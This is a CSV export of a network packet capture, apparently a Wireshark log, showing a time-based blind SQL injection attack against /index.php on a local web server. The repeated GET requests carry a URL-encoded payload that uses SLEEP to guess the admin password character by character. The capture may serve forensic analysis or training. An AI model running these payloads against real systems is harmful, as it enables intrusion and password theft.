"No","Time","Source","Destination","Protocol","Length","Info"
"148","5.869801707","192.168.1.2","150.95.139.51","TCP","74","80  >  33424 [SYN, ACK] Seq=0 Ack=1 Win=28960 Len=0 MSS=1460 SACK_PERM=1 TSval=2792897870 TSecr=3262423426 WS=128"
"149","5.870765541","150.95.139.51","192.168.1.2","TCP","66","33422  >  80 [ACK] Seq=364 Ack=619 Win=30464 Len=0 TSval=3262423427 TSecr=2792897868"
"150","5.872736565","192.168.1.2","150.95.139.51","TCP","66","[TCP Retransmission] 80  >  33398 [FIN, ACK] Seq=618 Ack=364 Win=30080 Len=0 TSval=2792897873 TSecr=3262423220"
"151","5.873700396","150.95.139.51","192.168.1.2","TCP","66","33424  >  80 [ACK] Seq=1 Ack=1 Win=29312 Len=0 TSval=3262423430 TSecr=2792897870"
"152","5.876793902","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C1%2C1%29%29%3D100%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"153","5.876861061","192.168.1.2","150.95.139.51","TCP","66","80  >  33424 [ACK] Seq=1 Ack=364 Win=30080 Len=0 TSval=2792897877 TSecr=3262423430"
"154","5.877038542","150.95.139.51","192.168.1.2","TCP","66","33398  >  80 [ACK] Seq=364 Ack=619 Win=30464 Len=0 TSval=3262423433 TSecr=2792897664"
"155","5.879344200","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"156","5.883383873","150.95.139.51","192.168.1.2","TCP","66","33424  >  80 [ACK] Seq=364 Ack=618 Win=30464 Len=0 TSval=3262423440 TSecr=2792897880"
"157","5.884165145","150.95.139.51","192.168.1.2","TCP","66","33424  >  80 [FIN, ACK] Seq=364 Ack=618 Win=30464 Len=0 TSval=3262423441 TSecr=2792897880"
"158","5.884316528","192.168.1.2","150.95.139.51","TCP","66","80  >  33424 [FIN, ACK] Seq=618 Ack=365 Win=30080 Len=0 TSval=2792897885 TSecr=3262423441"
"159","5.886793130","150.95.139.51","192.168.1.2","TCP","74","33426  >  80 [SYN] Seq=0 Win=29200 Len=0 MSS=1412 SACK_PERM=1 TSval=3262423443 TSecr=0 WS=128"
"160","5.886842977","192.168.1.2","150.95.139.51","TCP","74","80  >  33426 [SYN, ACK] Seq=0 Ack=1 Win=28960 Len=0 MSS=1460 SACK_PERM=1 TSval=2792897887 TSecr=3262423443 WS=128"
"161","5.887737957","150.95.139.51","192.168.1.2","TCP","66","33424  >  80 [ACK] Seq=365 Ack=619 Win=30464 Len=0 TSval=3262423444 TSecr=2792897885"
"162","5.890776489","150.95.139.51","192.168.1.2","TCP","66","33426  >  80 [ACK] Seq=1 Ack=1 Win=29312 Len=0 TSval=3262423447 TSecr=2792897887"
"163","5.890929421","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C1%2C1%29%29%3D101%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"164","5.890985938","192.168.1.2","150.95.139.51","TCP","66","80  >  33426 [ACK] Seq=1 Ack=364 Win=30080 Len=0 TSval=2792897891 TSecr=3262423447"
"165","5.893659425","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"166","5.897215082","150.95.139.51","192.168.1.2","TCP","66","33426  >  80 [ACK] Seq=364 Ack=618 Win=30464 Len=0 TSval=3262423454 TSecr=2792897894"
"167","5.898272328","150.95.139.51","192.168.1.2","TCP","66","33426  >  80 [FIN, ACK] Seq=364 Ack=618 Win=30464 Len=0 TSval=3262423455 TSecr=2792897894"
"168","5.898426821","192.168.1.2","150.95.139.51","TCP","66","80  >  33426 [FIN, ACK] Seq=618 Ack=365 Win=30080 Len=0 TSval=2792897899 TSecr=3262423455"
"169","5.900759318","150.95.139.51","192.168.1.2","TCP","74","33428  >  80 [SYN] Seq=0 Win=29200 Len=0 MSS=1412 SACK_PERM=1 TSval=3262423457 TSecr=0 WS=128"
"170","5.900807517","192.168.1.2","150.95.139.51","TCP","74","80  >  33428 [SYN, ACK] Seq=0 Ack=1 Win=28960 Len=0 MSS=1460 SACK_PERM=1 TSval=2792897901 TSecr=3262423457 WS=128"
"171","5.902341460","150.95.139.51","192.168.1.2","TCP","66","33426  >  80 [ACK] Seq=365 Ack=619 Win=30464 Len=0 TSval=3262423458 TSecr=2792897899"
"172","5.904768482","150.95.139.51","192.168.1.2","TCP","66","33428  >  80 [ACK] Seq=1 Ack=1 Win=29312 Len=0 TSval=3262423461 TSecr=2792897901"
"173","5.905071906","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C1%2C1%29%29%3D102%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"174","5.905136767","192.168.1.2","150.95.139.51","TCP","66","80  >  33428 [ACK] Seq=1 Ack=364 Win=30080 Len=0 TSval=2792897906 TSecr=3262423461"
"175","5.907870145","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"176","5.911866383","150.95.139.51","192.168.1.2","TCP","66","33428  >  80 [ACK] Seq=364 Ack=618 Win=30464 Len=0 TSval=3262423468 TSecr=2792897908"
"177","5.913912812","150.95.139.51","192.168.1.2","TCP","66","33428  >  80 [FIN, ACK] Seq=364 Ack=618 Win=30464 Len=0 TSval=3262423469 TSecr=2792897908"
"178","5.914068215","192.168.1.2","150.95.139.51","TCP","66","80  >  33428 [FIN, ACK] Seq=618 Ack=365 Win=30080 Len=0 TSval=2792897914 TSecr=3262423469"
"179","5.915530131","150.95.139.51","192.168.1.2","TCP","74","33430  >  80 [SYN] Seq=0 Win=29200 Len=0 MSS=1412 SACK_PERM=1 TSval=3262423472 TSecr=0 WS=128"
"180","5.915580728","192.168.1.2","150.95.139.51","TCP","74","80  >  33430 [SYN, ACK] Seq=0 Ack=1 Win=28960 Len=0 MSS=1460 SACK_PERM=1 TSval=2792897916 TSecr=3262423472 WS=128"
"181","5.917672854","150.95.139.51","192.168.1.2","TCP","66","33428  >  80 [ACK] Seq=365 Ack=619 Win=30464 Len=0 TSval=3262423474 TSecr=2792897914"
"182","5.923570780","150.95.139.51","192.168.1.2","TCP","66","33430  >  80 [ACK] Seq=1 Ack=1 Win=29312 Len=0 TSval=3262423476 TSecr=2792897916"
"183","5.923641030","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C1%2C1%29%29%3D103%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"184","5.923689103","192.168.1.2","150.95.139.51","TCP","66","80  >  33430 [ACK] Seq=1 Ack=364 Win=30080 Len=0 TSval=2792897924 TSecr=3262423476"
"185","5.926395168","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"186","5.931226045","150.95.139.51","192.168.1.2","TCP","66","33430  >  80 [ACK] Seq=364 Ack=618 Win=30464 Len=0 TSval=3262423487 TSecr=2792897927"
"187","5.931294345","150.95.139.51","192.168.1.2","TCP","66","33430  >  80 [FIN, ACK] Seq=364 Ack=618 Win=30464 Len=0 TSval=3262423488 TSecr=2792897927"
"188","5.931390300","192.168.1.2","150.95.139.51","TCP","66","80  >  33430 [FIN, ACK] Seq=618 Ack=365 Win=30080 Len=0 TSval=2792897932 TSecr=3262423488"
"189","5.934059922","150.95.139.51","192.168.1.2","TCP","74","33432  >  80 [SYN] Seq=0 Win=29200 Len=0 MSS=1412 SACK_PERM=1 TSval=3262423490 TSecr=0 WS=128"
"190","5.934109979","192.168.1.2","150.95.139.51","TCP","74","80  >  33432 [SYN, ACK] Seq=0 Ack=1 Win=28960 Len=0 MSS=1460 SACK_PERM=1 TSval=2792897935 TSecr=3262423490 WS=128"
"191","5.934968272","150.95.139.51","192.168.1.2","TCP","66","33430  >  80 [ACK] Seq=365 Ack=619 Win=30464 Len=0 TSval=3262423492 TSecr=2792897932"
"192","5.937874683","150.95.139.51","192.168.1.2","TCP","66","33432  >  80 [ACK] Seq=1 Ack=1 Win=29312 Len=0 TSval=3262423494 TSecr=2792897935"
"193","5.938230685","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C1%2C1%29%29%3D104%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"194","5.938296791","192.168.1.2","150.95.139.51","TCP","66","80  >  33432 [ACK] Seq=1 Ack=364 Win=30080 Len=0 TSval=2792897939 TSecr=3262423494"
"195","5.941016688","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"196","5.944829766","150.95.139.51","192.168.1.2","TCP","66","33432  >  80 [ACK] Seq=364 Ack=618 Win=30464 Len=0 TSval=3262423501 TSecr=2792897941"
"197","5.945580160","150.95.139.51","192.168.1.2","TCP","66","33432  >  80 [FIN, ACK] Seq=364 Ack=618 Win=30464 Len=0 TSval=3262423502 TSecr=2792897941"
"198","5.945692266","192.168.1.2","150.95.139.51","TCP","66","80  >  33432 [FIN, ACK] Seq=618 Ack=365 Win=30080 Len=0 TSval=2792897946 TSecr=3262423502"
"199","5.948436109","150.95.139.51","192.168.1.2","TCP","74","33434  >  80 [SYN] Seq=0 Win=29200 Len=0 MSS=1412 SACK_PERM=1 TSval=3262423505 TSecr=0 WS=128"
"200","5.948488646","192.168.1.2","150.95.139.51","TCP","74","80  >  33434 [SYN, ACK] Seq=0 Ack=1 Win=28960 Len=0 MSS=1460 SACK_PERM=1 TSval=2792897949 TSecr=3262423505 WS=128"
"201","5.949207677","150.95.139.51","192.168.1.2","TCP","66","33432  >  80 [ACK] Seq=365 Ack=619 Win=30464 Len=0 TSval=3262423506 TSecr=2792897946"
"202","5.952288642","150.95.139.51","192.168.1.2","TCP","66","33434  >  80 [ACK] Seq=1 Ack=1 Win=29312 Len=0 TSval=3262423509 TSecr=2792897949"
"203","5.952402857","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C1%2C1%29%29%3D105%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"204","5.952450810","192.168.1.2","150.95.139.51","TCP","66","80  >  33434 [ACK] Seq=1 Ack=364 Win=30080 Len=0 TSval=2792897953 TSecr=3262423509"
"205","5.955126350","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"206","5.959014968","150.95.139.51","192.168.1.2","TCP","66","33434  >  80 [ACK] Seq=364 Ack=618 Win=30464 Len=0 TSval=3262423515 TSecr=2792897956"
"207","5.959855977","150.95.139.51","192.168.1.2","TCP","66","33434  >  80 [FIN, ACK] Seq=364 Ack=618 Win=30464 Len=0 TSval=3262423516 TSecr=2792897956"
"208","5.960014931","192.168.1.2","150.95.139.51","TCP","66","80  >  33434 [FIN, ACK] Seq=618 Ack=365 Win=30080 Len=0 TSval=2792897960 TSecr=3262423516"
"209","5.962290471","150.95.139.51","192.168.1.2","TCP","74","33436  >  80 [SYN] Seq=0 Win=29200 Len=0 MSS=1412 SACK_PERM=1 TSval=3262423519 TSecr=0 WS=128"
"210","5.962327626","192.168.1.2","150.95.139.51","TCP","74","80  >  33436 [SYN, ACK] Seq=0 Ack=1 Win=28960 Len=0 MSS=1460 SACK_PERM=1 TSval=2792897963 TSecr=3262423519 WS=128"
"211","5.963683927","150.95.139.51","192.168.1.2","TCP","66","33434  >  80 [ACK] Seq=365 Ack=619 Win=30464 Len=0 TSval=3262423520 TSecr=2792897960"
"212","5.966164988","150.95.139.51","192.168.1.2","TCP","66","33436  >  80 [ACK] Seq=1 Ack=1 Win=29312 Len=0 TSval=3262423523 TSecr=2792897963"
"213","5.966787579","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C1%2C1%29%29%3D106%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"214","5.966854651","192.168.1.2","150.95.139.51","TCP","66","80  >  33436 [ACK] Seq=1 Ack=364 Win=30080 Len=0 TSval=2792897967 TSecr=3262423523"
"215","5.969573904","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"216","5.973724514","150.95.139.51","192.168.1.2","TCP","66","33436  >  80 [ACK] Seq=364 Ack=618 Win=30464 Len=0 TSval=3262423530 TSecr=2792897970"
"217","5.974857705","150.95.139.51","192.168.1.2","TCP","66","33436  >  80 [FIN, ACK] Seq=364 Ack=618 Win=30464 Len=0 TSval=3262423531 TSecr=2792897970"
"218","5.975013409","192.168.1.2","150.95.139.51","TCP","66","80  >  33436 [FIN, ACK] Seq=618 Ack=365 Win=30080 Len=0 TSval=2792897975 TSecr=3262423531"
"219","5.980548415","150.95.139.51","192.168.1.2","TCP","74","33438  >  80 [SYN] Seq=0 Win=29200 Len=0 MSS=1412 SACK_PERM=1 TSval=3262423534 TSecr=0 WS=128"
"220","5.980548542","150.95.139.51","192.168.1.2","TCP","66","33436  >  80 [ACK] Seq=365 Ack=619 Win=30464 Len=0 TSval=3262423535 TSecr=2792897975"
"221","5.980595342","192.168.1.2","150.95.139.51","TCP","74","80  >  33438 [SYN, ACK] Seq=0 Ack=1 Win=28960 Len=0 MSS=1460 SACK_PERM=1 TSval=2792897981 TSecr=3262423534 WS=128"
"222","5.984591859","150.95.139.51","192.168.1.2","TCP","66","33438  >  80 [ACK] Seq=1 Ack=1 Win=29312 Len=0 TSval=3262423541 TSecr=2792897981"
"223","5.984623482","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C1%2C1%29%29%3D107%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"224","5.984668849","192.168.1.2","150.95.139.51","TCP","66","80  >  33438 [ACK] Seq=1 Ack=364 Win=30080 Len=0 TSval=2792897985 TSecr=3262423541"
"225","5.987354618","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"226","5.991431957","150.95.139.51","192.168.1.2","TCP","66","33438  >  80 [ACK] Seq=364 Ack=618 Win=30464 Len=0 TSval=3262423548 TSecr=2792897988"
"227","5.992592754","150.95.139.51","192.168.1.2","TCP","66","33438  >  80 [FIN, ACK] Seq=364 Ack=618 Win=30464 Len=0 TSval=3262423549 TSecr=2792897988"
"228","5.992744617","192.168.1.2","150.95.139.51","TCP","66","80  >  33438 [FIN, ACK] Seq=618 Ack=365 Win=30080 Len=0 TSval=2792897993 TSecr=3262423549"
"229","5.996414435","150.95.139.51","192.168.1.2","TCP","74","33440  >  80 [SYN] Seq=0 Win=29200 Len=0 MSS=1412 SACK_PERM=1 TSval=3262423553 TSecr=0 WS=128"
"230","5.996463918","192.168.1.2","150.95.139.51","TCP","74","80  >  33440 [SYN, ACK] Seq=0 Ack=1 Win=28960 Len=0 MSS=1460 SACK_PERM=1 TSval=2792897997 TSecr=3262423553 WS=128"
"231","5.996501084","150.95.139.51","192.168.1.2","TCP","66","33438  >  80 [ACK] Seq=365 Ack=619 Win=30464 Len=0 TSval=3262423553 TSecr=2792897993"
"232","6.000273565","150.95.139.51","192.168.1.2","TCP","66","33440  >  80 [ACK] Seq=1 Ack=1 Win=29312 Len=0 TSval=3262423557 TSecr=2792897997"
"233","6.000304837","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C1%2C1%29%29%3D108%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"234","6.000350416","192.168.1.2","150.95.139.51","TCP","66","80  >  33440 [ACK] Seq=1 Ack=364 Win=30080 Len=0 TSval=2792898001 TSecr=3262423557"
"235","6.003061065","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"236","6.007056649","150.95.139.51","192.168.1.2","TCP","66","33440  >  80 [ACK] Seq=364 Ack=618 Win=30464 Len=0 TSval=3262423564 TSecr=2792898004"
"237","6.007843892","150.95.139.51","192.168.1.2","TCP","66","33440  >  80 [FIN, ACK] Seq=364 Ack=618 Win=30464 Len=0 TSval=3262423565 TSecr=2792898004"
"238","6.007990078","192.168.1.2","150.95.139.51","TCP","66","80  >  33440 [FIN, ACK] Seq=618 Ack=365 Win=30080 Len=0 TSval=2792898008 TSecr=3262423565"
"239","6.010709992","150.95.139.51","192.168.1.2","TCP","74","33442  >  80 [SYN] Seq=0 Win=29200 Len=0 MSS=1412 SACK_PERM=1 TSval=3262423567 TSecr=0 WS=128"
"240","6.010759623","192.168.1.2","150.95.139.51","TCP","74","80  >  33442 [SYN, ACK] Seq=0 Ack=1 Win=28960 Len=0 MSS=1460 SACK_PERM=1 TSval=2792898011 TSecr=3262423567 WS=128"
"241","6.011404133","150.95.139.51","192.168.1.2","TCP","66","33440  >  80 [ACK] Seq=365 Ack=619 Win=30464 Len=0 TSval=3262423568 TSecr=2792898008"
"242","6.014678467","150.95.139.51","192.168.1.2","TCP","66","33442  >  80 [ACK] Seq=1 Ack=1 Win=29312 Len=0 TSval=3262423571 TSecr=2792898011"
"243","6.014887589","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C1%2C1%29%29%3D109%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"244","6.014953469","192.168.1.2","150.95.139.51","TCP","66","80  >  33442 [ACK] Seq=1 Ack=364 Win=30080 Len=0 TSval=2792898015 TSecr=3262423571"
"245","6.017646500","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"246","6.027899096","150.95.139.51","192.168.1.2","TCP","66","33442  >  80 [ACK] Seq=364 Ack=618 Win=30464 Len=0 TSval=3262423584 TSecr=2792898018"
"247","6.028573441","150.95.139.51","192.168.1.2","TCP","66","33442  >  80 [FIN, ACK] Seq=364 Ack=618 Win=30464 Len=0 TSval=3262423585 TSecr=2792898018"
"248","6.028714922","192.168.1.2","150.95.139.51","TCP","66","80  >  33442 [FIN, ACK] Seq=618 Ack=365 Win=30080 Len=0 TSval=2792898029 TSecr=3262423585"
"249","6.031604849","150.95.139.51","192.168.1.2","TCP","74","33444  >  80 [SYN] Seq=0 Win=29200 Len=0 MSS=1412 SACK_PERM=1 TSval=3262423588 TSecr=0 WS=128"
"250","6.031654833","192.168.1.2","150.95.139.51","TCP","74","80  >  33444 [SYN, ACK] Seq=0 Ack=1 Win=28960 Len=0 MSS=1460 SACK_PERM=1 TSval=2792898032 TSecr=3262423588 WS=128"
"251","6.034606690","150.95.139.51","192.168.1.2","TCP","66","33442  >  80 [ACK] Seq=365 Ack=619 Win=30464 Len=0 TSval=3262423589 TSecr=2792898029"
"252","6.035302919","150.95.139.51","192.168.1.2","TCP","66","33444  >  80 [ACK] Seq=1 Ack=1 Win=29312 Len=0 TSval=3262423592 TSecr=2792898032"
"253","6.035726889","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C1%2C1%29%29%3D110%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"254","6.035792298","192.168.1.2","150.95.139.51","TCP","66","80  >  33444 [ACK] Seq=1 Ack=364 Win=30080 Len=0 TSval=2792898036 TSecr=3262423592"
"255","6.038304874","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"256","6.042245462","150.95.139.51","192.168.1.2","TCP","66","33444  >  80 [ACK] Seq=364 Ack=618 Win=30464 Len=0 TSval=3262423599 TSecr=2792898039"
"257","6.042927033","150.95.139.51","192.168.1.2","TCP","66","33444  >  80 [FIN, ACK] Seq=364 Ack=618 Win=30464 Len=0 TSval=3262423600 TSecr=2792898039"
"258","6.043081900","192.168.1.2","150.95.139.51","TCP","66","80  >  33444 [FIN, ACK] Seq=618 Ack=365 Win=30080 Len=0 TSval=2792898044 TSecr=3262423600"
"259","6.045585605","150.95.139.51","192.168.1.2","TCP","74","33446  >  80 [SYN] Seq=0 Win=29200 Len=0 MSS=1412 SACK_PERM=1 TSval=3262423602 TSecr=0 WS=128"
"260","6.045635242","192.168.1.2","150.95.139.51","TCP","74","80  >  33446 [SYN, ACK] Seq=0 Ack=1 Win=28960 Len=0 MSS=1460 SACK_PERM=1 TSval=2792898046 TSecr=3262423602 WS=128"
"261","6.046324719","150.95.139.51","192.168.1.2","TCP","66","33444  >  80 [ACK] Seq=365 Ack=619 Win=30464 Len=0 TSval=3262423603 TSecr=2792898044"
"262","6.049165163","150.95.139.51","192.168.1.2","TCP","66","33446  >  80 [ACK] Seq=1 Ack=1 Win=29312 Len=0 TSval=3262423606 TSecr=2792898046"
"263","6.049590083","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C1%2C1%29%29%3D111%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"264","6.049657344","192.168.1.2","150.95.139.51","TCP","66","80  >  33446 [ACK] Seq=1 Ack=364 Win=30080 Len=0 TSval=2792898050 TSecr=3262423606"
"265","6.052385693","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"266","6.056214801","150.95.139.51","192.168.1.2","TCP","66","33446  >  80 [ACK] Seq=364 Ack=618 Win=30464 Len=0 TSval=3262423613 TSecr=2792898053"
"267","6.056682606","150.95.139.51","192.168.1.2","TCP","66","33446  >  80 [FIN, ACK] Seq=364 Ack=618 Win=30464 Len=0 TSval=3262423613 TSecr=2792898053"
"268","6.056824641","192.168.1.2","150.95.139.51","TCP","66","80  >  33446 [FIN, ACK] Seq=618 Ack=365 Win=30080 Len=0 TSval=2792898057 TSecr=3262423613"
"269","6.059179662","150.95.139.51","192.168.1.2","TCP","74","33448  >  80 [SYN] Seq=0 Win=29200 Len=0 MSS=1412 SACK_PERM=1 TSval=3262423616 TSecr=0 WS=128"
"270","6.059219866","192.168.1.2","150.95.139.51","TCP","74","80  >  33448 [SYN, ACK] Seq=0 Ack=1 Win=28960 Len=0 MSS=1460 SACK_PERM=1 TSval=2792898060 TSecr=3262423616 WS=128"
"271","6.060154816","150.95.139.51","192.168.1.2","TCP","66","33446  >  80 [ACK] Seq=365 Ack=619 Win=30464 Len=0 TSval=3262423617 TSecr=2792898057"
"272","6.063064999","150.95.139.51","192.168.1.2","TCP","66","33448  >  80 [ACK] Seq=1 Ack=1 Win=29312 Len=0 TSval=3262423620 TSecr=2792898060"
"273","6.063461404","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C1%2C1%29%29%3D112%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"274","6.063527429","192.168.1.2","150.95.139.51","TCP","66","80  >  33448 [ACK] Seq=1 Ack=364 Win=30080 Len=0 TSval=2792898064 TSecr=3262423620"
"275","6.066281163","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"276","6.071212917","150.95.139.51","192.168.1.2","TCP","66","33448  >  80 [ACK] Seq=364 Ack=618 Win=30464 Len=0 TSval=3262423627 TSecr=2792898067"
"277","6.071911877","150.95.139.51","192.168.1.2","TCP","66","33448  >  80 [FIN, ACK] Seq=364 Ack=618 Win=30464 Len=0 TSval=3262423627 TSecr=2792898067"
"278","6.072057013","192.168.1.2","150.95.139.51","TCP","66","80  >  33448 [FIN, ACK] Seq=618 Ack=365 Win=30080 Len=0 TSval=2792898073 TSecr=3262423627"
"279","6.072879999","150.95.139.51","192.168.1.2","TCP","74","33450  >  80 [SYN] Seq=0 Win=29200 Len=0 MSS=1412 SACK_PERM=1 TSval=3262423629 TSecr=0 WS=128"
"280","6.072930614","192.168.1.2","150.95.139.51","TCP","74","80  >  33450 [SYN, ACK] Seq=0 Ack=1 Win=28960 Len=0 MSS=1460 SACK_PERM=1 TSval=2792898073 TSecr=3262423629 WS=128"
"281","6.075785241","150.95.139.51","192.168.1.2","TCP","66","33448  >  80 [ACK] Seq=365 Ack=619 Win=30464 Len=0 TSval=3262423632 TSecr=2792898073"
"282","6.075850421","150.95.139.51","192.168.1.2","TCP","66","33450  >  80 [ACK] Seq=1 Ack=1 Win=29312 Len=0 TSval=3262423633 TSecr=2792898073"
"283","6.076293500","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C1%2C1%29%29%3D113%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"284","6.076346060","192.168.1.2","150.95.139.51","TCP","66","80  >  33450 [ACK] Seq=1 Ack=364 Win=30080 Len=0 TSval=2792898077 TSecr=3262423633"
"285","6.079094720","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"286","6.083957186","150.95.139.51","192.168.1.2","TCP","66","33450  >  80 [ACK] Seq=364 Ack=618 Win=30464 Len=0 TSval=3262423641 TSecr=2792898080"
"287","6.084848327","150.95.139.51","192.168.1.2","TCP","66","33450  >  80 [FIN, ACK] Seq=364 Ack=618 Win=30464 Len=0 TSval=3262423641 TSecr=2792898080"
"288","6.085008188","192.168.1.2","150.95.139.51","TCP","66","80  >  33450 [FIN, ACK] Seq=618 Ack=365 Win=30080 Len=0 TSval=2792898085 TSecr=3262423641"
